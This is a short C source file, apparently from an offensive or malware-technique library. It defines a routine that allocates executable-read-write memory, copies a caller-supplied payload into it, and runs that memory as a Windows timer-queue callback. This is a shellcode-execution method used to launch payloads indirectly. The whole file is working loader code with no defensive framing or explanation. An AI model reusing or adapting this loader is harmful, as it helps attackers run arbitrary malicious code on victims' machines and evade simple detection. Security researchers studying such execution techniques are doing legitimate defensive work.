#include "Win32Helper.h"

VOID InvokeCreateTimerQueueTimerCallbackRoutine(LPVOID lpParameter)
{
	HANDLE Timer = NULL, Queue = NULL, Event = NULL;

	Queue = CreateTimerQueue();
	if (Queue == NULL)
		goto EXIT_ROUTINE;

	Event = CreateEventW(NULL, TRUE, FALSE, NULL);
	if (Event == NULL)
		goto EXIT_ROUTINE;

	if (!CreateTimerQueueTimer(&Timer, Queue, (WAITORTIMERCALLBACK)lpParameter, NULL, 100, 0, 0))
		goto EXIT_ROUTINE;

	WaitForSingleObject(Event, INFINITE);

EXIT_ROUTINE:

	if (Event)
		CloseHandle(Event);

#pragma warning( push )
#pragma warning( disable : 6031)
	if(Queue)
		DeleteTimerQueue(Queue);
#pragma warning( pop ) 

	return;
}

BOOL MpfSceViaCreateTimerQueueTimer(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeCreateTimerQueueTimerCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}